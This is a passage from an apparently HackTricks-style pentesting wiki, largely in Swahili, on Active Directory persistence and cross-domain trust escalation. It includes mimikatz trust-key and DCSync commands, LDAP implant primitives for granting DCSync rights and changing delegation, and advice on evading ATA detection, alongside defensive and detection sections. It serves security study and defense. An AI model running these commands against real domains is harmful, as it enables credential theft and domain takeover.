**Golden Ticket attack** huhusisha mshambulizi kupata ufikiaji wa **NTLM hash ya akaunti ya krbtgt** katika mazingira ya Active Directory (AD). Akaunti hii ni maalum kwa sababu hutumiwa kusaini **Ticket Granting Tickets (TGTs)** zote, ambazo ni muhimu kwa uthibitishaji ndani ya network ya AD.

Mara mshambulizi anapopata hash hii, anaweza kuunda **TGTs** kwa akaunti yoyote anayoichagua (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizoghushiwa kwa njia inayoweza **kuepuka common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na certificates za akaunti au uwezo wa kuziomba** ni njia nzuri sana ya kuweza kudumu kwenye akaunti ya user (hata kama anabadilisha password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Kutumia certificates pia kunawezesha kudumu na high privileges ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Object ya **AdminSDHolder** kwenye Active Directory huhakikisha usalama wa **privileged groups** (kama Domain Admins na Enterprise Admins) kwa kutumia standard **Access Control List (ACL)** kwa groups hizi zote ili kuzuia mabadiliko yasiyoidhinishwa. Hata hivyo, kipengele hiki kinaweza kutumiwa vibaya; ikiwa mshambulizi anarekebisha ACL ya AdminSDHolder ili kumpa user wa kawaida full access, user huyo hupata udhibiti mpana juu ya privileged groups zote. Hatua hii ya usalama, iliyokusudiwa kulinda, hivyo inaweza kugeuka dhidi yake na kuruhusu ufikiaji usiofaa isipokuwa ifuatiliwe kwa karibu.

[**Taarifa zaidi kuhusu AdminDSHolder Group hapa.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Ndani ya kila **Domain Controller (DC)**, kuna akaunti ya **local administrator**. Kwa kupata admin rights kwenye machine kama hiyo, local Administrator hash inaweza kutolewa kwa kutumia **mimikatz**. Baada ya hapo, mabadiliko ya registry yanahitajika ili **kuwezesha matumizi ya password hii**, kuruhusu access ya mbali kwa akaunti ya local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumpa** **user** baadhi ya **special permissions** juu ya baadhi ya specific domain objects ambazo zitamruhusu user huyo **kukuza privileges baadaye**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** hutumiwa **kuhifadhi** **permissions** ambazo **object** inazo **juu ya** object nyingine. Ukiweza tu **kufanya** **mabadiliko madogo** kwenye **security descriptor** ya object, unaweza kupata privileges za kuvutia sana juu ya object hiyo bila kuhitaji kuwa mwanachama wa privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Tumia vibaya `dynamicObject` auxiliary class kuunda principals/GPOs/DNS records za muda mfupi na `entryTTL`/`msDS-Entry-Time-To-Die`; hujifuta zenyewe bila tombstones, zikifuta ushahidi wa LDAP huku zikiacha orphan SIDs, broken `gPLink` references, au cached DNS responses (kwa mfano, AdminSDHolder ACE pollution au malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** kwenye memory ili kuanzisha **universal password**, na kutoa access kwa akaunti zote za domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Jifunze SSP (Security Support Provider) ni nini hapa.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kukamata** kwa **clear text** credentials zinazotumiwa kufikia machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Husajili **Domain Controller mpya** kwenye AD na kuitumia **kusukuma attributes** (SIDHistory, SPNs...) kwenye objects maalum **bila** kuacha **logs** zozote kuhusu **mabadiliko**. Unahitaji privileges za **DA** na uwe ndani ya **root domain**.\
Kumbuka kwamba ukitumia data isiyo sahihi, logs mbaya sana zitaonekana.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Hapo awali tumejadili jinsi ya kukuza privileges ikiwa una **ruhusa ya kutosha kusoma LAPS passwords**. Hata hivyo, passwords hizi pia zinaweza kutumiwa ili **kudumisha persistence**.\
Angalia:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft huiona **Forest** kama mpaka wa usalama. Hii inaashiria kwamba **kuchukua udhibiti wa domain moja kunaweza kusababisha Forest nzima kuchukuliwa udhibiti**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni utaratibu wa usalama unaomwezesha user kutoka **domain** moja kufikia resources kwenye **domain** nyingine. Kimsingi huunda uhusiano kati ya authentication systems za domain hizo mbili, na kuruhusu uthibitishaji kupita kwa urahisi. Domains zinapoweka trust, hubadilishana na kuhifadhi **keys** maalum ndani ya **Domain Controllers (DCs)** zao, ambazo ni muhimu kwa uadilifu wa trust.

Katika hali ya kawaida, ikiwa user anataka kufikia service ndani ya **trusted domain**, kwanza lazima aombe ticket maalum inayoitwa **inter-realm TGT** kutoka kwa DC ya domain yake mwenyewe. TGT hii husimbwa kwa kutumia **key** ya pamoja ambayo domain zote mbili zimekubaliana. Kisha user anaonyesha TGT hii kwa **DC ya trusted domain** ili kupata service ticket (**TGS**). Baada ya inter-realm TGT kuthibitishwa kwa mafanikio na DC ya trusted domain, inatoa TGS, na kumpa user access kwa service.

**Hatua**:

1. **Client computer** katika **Domain 1** huanza mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)** wake.
2. DC1 hutoa TGT mpya ikiwa client amethibitishwa kwa mafanikio.
3. Kisha client huomba **inter-realm TGT** kutoka DC1, ambayo inahitajika kufikia resources katika **Domain 2**.
4. Inter-realm TGT husimbwa kwa kutumia **trust key** iliyoshirikiwa kati ya DC1 na DC2 kama sehemu ya two-way domain trust.
5. Client hupeleka inter-realm TGT kwa **Domain 2's Domain Controller (DC2)**.
6. DC2 huthibitisha inter-realm TGT kwa kutumia trust key yake ya pamoja na, ikiwa ni halali, hutoa **Ticket Granting Service (TGS)** kwa server ndani ya Domain 2 ambayo client anataka kufikia.
7. Mwishoni, client huwasilisha TGS hii kwa server, ambayo imesimbwa kwa kutumia hash ya akaunti ya server, ili kupata access kwa service ndani ya Domain 2.

### Different trusts

Ni muhimu kutambua kwamba **trust inaweza kuwa ya njia 1 au njia 2**. Katika chaguo la njia 2, domains zote mbili zitamuaminiana, lakini katika trust relation ya **njia 1** moja ya domains itakuwa **trusted** na nyingine **trusting**. Katika kesi ya mwisho, **utaweza tu kufikia resources ndani ya trusting domain kutoka kwenye trusted one**.

Ikiwa Domain A inaamini Domain B, A ni trusting domain na B ni trusted one. Zaidi ya hayo, katika **Domain A**, hii itakuwa **Outbound trust**; na katika **Domain B**, hii itakuwa **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Hii ni setup ya kawaida ndani ya forest moja, ambapo child domain moja kwa moja huwa na two-way transitive trust na parent domain yake. Kimsingi, hii ina maana kwamba authentication requests zinaweza kupita kwa urahisi kati ya parent na child.
- **Cross-link Trusts**: Zinaoitwa "shortcut trusts," hizi huanzishwa kati ya child domains ili kuharakisha referral processes. Katika forests tata, authentication referrals kwa kawaida hulazimika kupanda hadi forest root kisha kushuka hadi target domain. Kwa kuunda cross-links, safari hupunguzwa, jambo ambalo ni muhimu hasa katika mazingira yaliyosambaa kijiografia.
- **External Trusts**: Hizi huwekwa kati ya domains tofauti, zisizohusiana, na kwa asili si transitive. Kulingana na [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts zinafaa kwa kufikia resources kwenye domain iliyo nje ya forest ya sasa ambayo haijaunganishwa na forest trust. Usalama huimarishwa kupitia SID filtering na external trusts.
- **Tree-root Trusts**: Hizi trusts huanzishwa kiotomatiki kati ya forest root domain na tree root mpya iliyoongezwa. Ingawa si za kawaida kukutana nazo, tree-root trusts ni muhimu kwa kuongeza domain trees mpya kwenye forest, na kuwawezesha kudumisha unique domain name na kuhakikisha two-way transitivity. Taarifa zaidi zinaweza kupatikana katika [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni two-way transitive trust kati ya forest root domains mbili, na pia hutekeleza SID filtering ili kuongeza hatua za usalama.
- **MIT Trusts**: Hizi trusts huanzishwa na Kerberos domains zisizo za Windows, zinazotii [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalum zaidi na hulenga mazingira yanayohitaji integration na systems za Kerberos nje ya ekosistemu ya Windows.

#### Other differences in **trusting relationships**

- Trust relationship pia inaweza kuwa **transitive** (A trust B, B trust C, kisha A trust C) au **non-transitive**.
- Trust relationship pia inaweza kusanidiwa kama **bidirectional trust** (zote zinaaminiana) au kama **one-way trust** (moja tu inaamini nyingine).

### Attack Path

1. **Enumerate** trusting relationships
2. Angalia kama security principal yoyote (user/group/computer) ina **access** kwa resources za **other domain**, labda kupitia ACE entries au kwa kuwa ndani ya groups za domain nyingine. Tafuta **relationships across domains** (trust huenda iliundwa kwa hili).
1. kerberoast katika kesi hii inaweza kuwa chaguo jingine.
3. **Compromise** **accounts** ambazo zinaweza **pivot** kupitia domains.

Attackers wenye access kwa resources katika domain nyingine kupitia njia kuu tatu ni:

- **Local Group Membership**: Principals wanaweza kuongezwa kwenye local groups kwenye machines, kama “Administrators” group kwenye server, na hivyo kuwapa udhibiti mkubwa juu ya machine hiyo.
- **Foreign Domain Group Membership**: Principals pia wanaweza kuwa members wa groups ndani ya foreign domain. Hata hivyo, ufanisi wa njia hii unategemea asili ya trust na scope ya group.
- **Access Control Lists (ACLs)**: Principals wanaweza kutajwa ndani ya **ACL**, hasa kama entities ndani ya **ACEs** ndani ya **DACL**, na hivyo kuwapa access kwa resources maalum. Kwa wanaotaka kuelewa zaidi mechanics za ACLs, DACLs, na ACEs, whitepaper yenye kichwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni resource muhimu sana.

### Find external users/groups with permissions

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** ili kupata foreign security principals kwenye domain. Hawa watakuwa user/group kutoka **domain/forest ya nje**.

Unaweza kuangalia hili katika **Bloodhound** au kwa kutumia powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Uongezaji wa mamlaka kutoka kwa Child hadi Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia nyingine za kuorodhesha domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **funguo 2 zinazoaminika**, moja kwa ajili ya _Child --> Parent_ na nyingine kwa _Parent_ --> _Child_.\
> Unaweza kutumia ile inayotumiwa na domain ya sasa kwa:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Panda hadi Enterprise admin kwenye child/parent domain kwa kutumia vibaya trust kwa SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Kuelewa jinsi Configuration Naming Context (NC) inaweza kutumiwa vibaya ni muhimu sana. Configuration NC hutumika kama hazina kuu ya data ya configuration kwa kila forest ndani ya Active Directory (AD) environments. Data hii hu-replicate kwenda kila Domain Controller (DC) ndani ya forest, huku writable DCs zikihifadhi nakala inayoweza kuandikwa ya Configuration NC. Ili kuitumia vibaya, mtu lazima awe na **SYSTEM privileges kwenye DC**, ikiwezekana child DC.

**Link GPO to root DC site**

Container ya Sites ndani ya Configuration NC ina taarifa kuhusu sites za kompyuta zote zilizojiunga na domain ndani ya AD forest. Kwa kufanya kazi na SYSTEM privileges kwenye DC yoyote, attackers wanaweza ku-link GPOs kwenye root DC sites. Kitendo hiki kinaweza kuhatarisha root domain kwa kubadilisha policies zinazotumika kwenye sites hizi.

Kwa taarifa za kina, mtu anaweza kuchunguza utafiti kuhusu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Njia moja ya attack inahusisha kulenga privileged gMSAs ndani ya domain. KDS Root key, muhimu kwa kuhesabu passwords za gMSAs, huhifadhiwa ndani ya Configuration NC. Ukiwa na SYSTEM privileges kwenye DC yoyote, inawezekana kufikia KDS Root key na kuhesabu passwords za gMSA yoyote ndani ya forest.

Uchambuzi wa kina na mwongozo wa hatua kwa hatua unaweza kupatikana katika:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Utafiti wa ziada wa nje: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Njia hii inahitaji subira, ikisubiri kuundwa kwa AD objects mpya zenye privilege. Ukiwa na SYSTEM privileges, attacker anaweza kurekebisha AD Schema ili kumpa user yeyote control kamili juu ya classes zote. Hii inaweza kusababisha access na control zisizoidhinishwa juu ya AD objects mpya zinazoundwa.

Usomaji zaidi unapatikana kwenye [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Udhaifu wa ADCS ESC5 unalenga control juu ya Public Key Infrastructure (PKI) objects ili kuunda certificate template inayowezesha authentication kama user yoyote ndani ya forest. Kwa kuwa PKI objects ziko ndani ya Configuration NC, kuhatarisha writable child DC kunaruhusu utekelezaji wa attacks za ESC5.

Maelezo zaidi kuhusu hili yanaweza kusomwa katika [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Katika hali zisizo na ADCS, attacker ana uwezo wa kusanidi vipengele vinavyohitajika, kama ilivyojadiliwa katika [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika hali hii **domain yako inaaminika** na ya nje ikikupa **ruhusa zisizoamuliwa** juu yake. Utahitaji kugundua **ni principals gani za domain yako zina access gani juu ya domain ya nje** kisha ujaribu kuitumia:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika hali hii **kikoa chako** kinatoa **ruhusa** fulani kwa principal kutoka **kikoa tofauti**.

Hata hivyo, wakati **kikoa kinapoaminwa** na kikoa kinachoamini, kikoa kinachoaminika **huunda mtumiaji** mwenye **jina linaloweza kutabiriwa** ambalo hutumia **nenosiri la trusted password** kama **password**. Hii inamaanisha kwamba inawezekana **kufikia mtumiaji kutoka kikoa kinachoamini** ili kuingia ndani ya kile kinachoaminika, kuki-enumerate na kujaribu kuongeza **ruhusa** zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya ku compromise kikoa kinachoaminika ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa katika **mwelekeo wa kinyume** wa domain trust (ambayo si ya kawaida sana).

Njia nyingine ya ku compromise kikoa kinachoaminika ni kungojea kwenye mashine ambapo **mtumiaji kutoka kikoa kinachoaminika anaweza kufikia** ili kuingia kupitia **RDP**. Kisha, attacker anaweza kuingiza code kwenye process ya RDP session na **kufikia origin domain ya victim** kutoka hapo.\
Zaidi ya hayo, ikiwa **victim ame-mount hard drive yake**, kutoka kwenye process ya **RDP session** attacker anaweza kuhifadhi **backdoors** kwenye **startup folder ya hard drive**. Mbinu hii inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Kupunguza matumizi mabaya ya domain trust

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia sifa ya SID history katika forest trusts inapunguzwa na SID Filtering, ambayo huwashwa kwa chaguo-msingi kwenye inter-forest trusts zote. Hii inategemea dhana kwamba intra-forest trusts ni salama, ikizingatia forest, badala ya domain, kama mpaka wa usalama kulingana na msimamo wa Microsoft.
- Hata hivyo, kuna kikwazo: SID filtering inaweza kuvuruga applications na user access, na hivyo wakati mwingine kuzimwa.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication huhakikisha kwamba users kutoka forest mbili hawathibitishwi kiotomatiki. Badala yake, ruhusa za wazi zinahitajika ili users waweze kufikia domains na servers ndani ya trusting domain au forest.
- Ni muhimu kutambua kwamba hatua hizi hazilindi dhidi ya unyonyaji wa writable Configuration Naming Context (NC) au mashambulizi kwenye trust account.

[**Taarifa zaidi kuhusu domain trusts katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) inatekeleza upya LDAP primitives za mtindo wa bloodyAD kama x64 Beacon Object Files zinazofanya kazi kabisa ndani ya on-host implant (kwa mfano, Adaptix C2). Operators hu-compile pack kwa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, hu-load `ldap.axs`, kisha huita `ldap <subcommand>` kutoka kwenye beacon. Trafiki yote hupitia current logon security context kupitia LDAP (389) na signing/sealing au LDAPS (636) na auto certificate trust, hivyo hakuna socks proxies au disk artifacts zinazohitajika.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, na `get-groupmembers` hutafsiri short names/OU paths kuwa full DNs na kutoa objects husika.
- `get-object`, `get-attribute`, na `get-domaininfo` huvuta attributes za kiholela (ikiwemo security descriptors) pamoja na forest/domain metadata kutoka `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, na `get-rbcd` huonyesha roasting candidates, delegation settings, na descriptors zilizopo za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) moja kwa moja kutoka LDAP.
- `get-acl` na `get-writable --detailed` huchambua DACL ili kuorodhesha trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), na inheritance, na kutoa targets za haraka kwa ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) huruhusu operator kuanzisha principals au machine accounts mpya popote ambapo OU rights zipo. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` huchukua moja kwa moja udhibiti wa targets mara tu write-property rights zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` hutafsiri WriteDACL/WriteOwner kwenye AD object yoyote kuwa password resets, udhibiti wa group membership, au DCSync replication privileges bila kuacha PowerShell/ADSI artifacts. Counterparts za `remove-*` husafisha ACEs zilizoingizwa.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` hufanya user aliyeathiriwa awe Kerberoastable mara moja; `add-asreproastable` (UAC toggle) humweka kwa AS-REP roasting bila kugusa password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) huandika upya `msDS-AllowedToDelegateTo`, UAC flags, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwenye beacon, kuwezesha constrained/unconstrained/RBCD attack paths na kuondoa hitaji la remote PowerShell au RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` huingiza privileged SIDs kwenye SID history ya principal anayodhibitiwa (tazama [SID-History Injection](sid-history-injection.md)), ikitoa stealthy access inheritance kikamilifu kupitia LDAP/LDAPS.
- `move-object` hubadilisha DN/OU ya computers au users, ikimruhusu attacker kuvuta assets kwenda OUs ambako delegated rights tayari zipo kabla ya kutumia `set-password`, `add-groupmember`, au `add-spn`.
- Amri za removal zilizo na scope ndogo sana (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) huruhusu rollback ya haraka baada ya operator kuvuna credentials au persistence, kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Inapendekezwa kwamba Domain Admins waruhusiwe kuingia tu kwenye Domain Controllers, wakiepuka matumizi yao kwenye hosts nyingine.
- **Service Account Privileges**: Services hazipaswi kuendeshwa kwa kutumia Domain Admin (DA) privileges ili kudumisha usalama.
- **Temporal Privilege Limitation**: Kwa kazi zinazohitaji DA privileges, muda wake unapaswa kupunguzwa. Hii inaweza kufanywa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Chunguza Event IDs 2889/3074/3075 kisha tekeleza LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzuia LDAP MITM/relay attempts.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

If you want to detect common AD tradecraft, **do not rely only on operator-controlled artifacts** such as renamed binaries, service names, temp batch files, or output paths. Baseline how legitimate Windows clients build [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, and WMI traffic, then look for **implementation quirks** that remain even after the operator edits `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, or `ntlmrelayx.py`.

- **High-confidence standalone candidates** (after validating against your own baseline):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- Several of these traits from the same host/user/session/time window are far stronger than any single weak field
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, and tool-specific HTTP/WebDAV/RDP/MSSQL strings
- These are easy for operators to change and are best used to explain why a cross-protocol cluster is suspicious
- **Operational notes**:
- Some of these signals require decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, or service-side visibility
- Validate against Samba/Linux clients, appliances, and legacy software before promoting to alerts
- Promote detections from enrichment -> hunting -> alerting as you build confidence in the baseline

### **Implementing Deception Techniques**

- Implementing deception involves setting traps, like decoy users or computers, with features such as passwords that do not expire or are marked as Trusted for Delegation. A detailed approach includes creating users with specific rights or adding them to high privilege groups.
- A practical example involves using tools like: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Viashiria vya kushukiwa ni pamoja na ObjectSID isiyo ya kawaida, logons zisizotokea mara kwa mara, creation dates, na low bad password counts.
- **General Indicators**: Kulinganisha attributes za potential decoy objects na zile za halisi kunaweza kuonyesha inconsistencies. Tools kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua udanganyifu kama huo.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka session enumeration kwenye Domain Controllers ili kuzuia ATA detection.
- **Ticket Impersonation**: Kutumia **aes** keys kwa ajili ya ticket creation husaidia kuepuka detection kwa kutodowngrade kwenda NTLM.
- **DCSync Attacks**: Inashauriwa kutekeleza kutoka non-Domain Controller ili kuepuka ATA detection, kwa kuwa utekelezaji wa moja kwa moja kutoka Domain Controller utachochea alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
